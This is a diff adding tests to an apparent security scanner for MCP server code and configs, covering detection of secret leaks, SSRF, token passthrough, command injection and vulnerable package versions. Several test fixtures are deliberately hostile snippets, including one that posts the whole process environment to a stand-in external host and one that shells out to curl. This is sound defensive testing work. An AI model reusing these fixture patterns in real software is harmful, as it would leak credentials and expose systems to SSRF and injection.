@@ -39,6 +39,28 @@ test('flows: the tidy server stays clean and guards are respected', () => {
   assert.equal(secrets[0].id, 'NEM-FLOW-ENV-TO-NET');
 });
 
+test('flows: ordinary API-client code is not flagged; real leaks, SSRF and passthrough are', () => {
+  const quiet = {
+    'secret as a bearer header': "const KEY = process.env.API_KEY;\nconst r = await fetch('https://api.example.com/v1/x', { headers: { Authorization: `Bearer ${KEY}` } });\n",
+    'secret in a headers variable': "const KEY = process.env.API_KEY;\nconst headers = { 'X-Api-Key': KEY };\nawait fetch(URL, { headers });\n",
+    'python auth header': "key = os.environ['API_TOKEN']\nr = requests.get('https://api.example.com/x', headers={'Authorization': f'Bearer {key}'})\n",
+    'base URL and port from env': "const BASE = process.env.BASE_URL;\nconst { PORT } = process.env;\nawait fetch(`${BASE}/items`);\nawait fetch(`http://localhost:${PORT}/x`);\n",
+    'input after a fixed host': "export const t = { get: async (args) => fetch(`https://api.example.com/items/${args.id}`) };\n",
+    'input in the request body': "export const t = { add: async (args) => fetch('https://api.example.com/items', { method: 'POST', body: JSON.stringify(args.item) }) };\n",
+    'regex exec and array callbacks': "const m = /a(b)/.exec(args.text);\nconst rows = items.map(({ id, name }) => ({ id, name }));\nwriteFileSync(join(ROOT, 'out.json'), JSON.stringify(rows.map(({ id }) => id)));\n",
+    'input as file content, fixed path': "export const t = { save: async (args) => writeFileSync(OUT_FILE, args.text) };\n",
+    'fixed-host URL in a variable': "export const t = { get: async (args) => { const url = `https://api.example.com/items/${args.id}`; return fetch(url); } };\n",
+  };
+  for (const [name, code] of Object.entries(quiet)) assert.deepEqual(scanFlows(code).map((f) => f.id), [], name);
+  const loud = {
+    'NEM-FLOW-ENV-TO-NET': ["const KEY = process.env.API_KEY;\nawait fetch('https://x.example.invalid', { method: 'POST', body: JSON.stringify({ k: KEY }) });\n", "const KEY = process.env.MAPS_KEY;\nawait fetch(`https://maps.example.com/geo?key=${KEY}`);\n", "await fetch('https://x.example.invalid', { method: 'POST', body: JSON.stringify(process.env) });\n"],
+    'NEM-FLOW-INPUT-TO-NET': ["export const t = { get: async (args) => fetch(args.url) };\n", "export const t = { get: async ({ host }) => fetch(`https://${host}/x`) };\n", "export const t = { get: async (args) => axios({ url: args.target, method: 'get' }) };\n"],
+    'NEM-FLOW-INPUT-TO-EXEC': ["export const t = { dl: async (args) => { const url = `https://api.example.com/f/${args.id}`; return execSync('curl ' + url); } };\n"],
+    'NEM-TOKEN-PASSTHROUGH': ["const tok = req.headers.authorization;\nawait fetch('https://up.example.com', { headers: { authorization: tok } });\n"],
+  };
+  for (const [id, codes] of Object.entries(loud)) for (const code of codes) assert.deepEqual(scanFlows(code).map((f) => f.id), [id], code);
+});
+
 // ---- SARIF ----
 test('SARIF: valid 2.1.0, full rule metadata, codeFlows, suppressions, deterministic', () => {
   const policy = json('nemesis-policy.json');
@@ -86,6 +108,8 @@ test('advisory ranges and the bundled snapshot (config check, offline)', () => {
   assert.ok(bad.items.some((i) => i.id === 'NEM-CFG-ADVISORY' && /CVE-2025-6514/.test(i.title)));
   const good = scanConfig({ mcpServers: { r: { command: 'npx', args: ['-y', 'mcp-remote@0.1.16', 'https://mcp.example.com/sse'] } } }, { advisories: b.advisories });
   assert.equal(good.findings, 0);
+  const fsHit = (v) => scanConfig({ mcpServers: { f: { command: 'npx', args: ['-y', `@modelcontextprotocol/server-filesystem@${v}`, './project'] } } }, { advisories: b.advisories }).items.some((i) => i.id === 'NEM-CFG-ADVISORY');
+  assert.deepEqual(['0.6.2', '0.6.4', '2025.3.28', '2025.7.1'].map(fsHit), [true, false, true, false]);
 });
 
 // ---- config ----
@@ -206,4 +230,9 @@ test('MCP prompt walks the review end to end', async () => {
   assert.match(r.result.messages[0].content.text, /dir "srv"/);
   assert.equal(Object.keys(OWASP_MCP).length, 10);
   for (const [id, rule] of Object.entries(RULES)) { assert.ok(rule.fix && rule.why && rule.owasp.length && rule.cwe.length, id); for (const o of rule.owasp) assert.ok(OWASP_MCP[o], `${id} ${o}`); }
+});
+
+test('README rule table lists every rule with its current severity and title', () => {
+  const md = readFileSync(fileURLToPath(new URL('../README.md', import.meta.url)), 'utf8');
+  for (const [id, r] of Object.entries(RULES)) assert.ok(md.includes(`| \`${id}\` | ${r.severity} | ${r.title.replace(/\|/g, '/')} |`), id);
 });
